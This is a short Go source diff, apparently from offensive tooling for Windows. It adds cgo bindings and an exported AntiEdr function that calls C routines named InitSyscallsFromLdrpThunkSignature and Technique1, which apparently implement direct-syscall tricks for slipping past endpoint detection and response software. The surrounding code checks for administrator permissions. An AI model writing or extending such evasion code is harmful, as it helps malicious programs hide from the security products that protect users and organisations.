@@ -2,6 +2,12 @@
 
 package arch
 
+/*
+extern int InitSyscallsFromLdrpThunkSignature();
+extern int Technique1();
+*/
+import "C"
+
 import (
 	"context"
 	"fmt"
@@ -19,6 +25,11 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/text/encoding/charmap"
 )
+
+func AntiEdr() {
+	C.InitSyscallsFromLdrpThunkSignature()
+	C.Technique1()
+}
 
 // https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
 func Permissions() (bool, bool, error) {
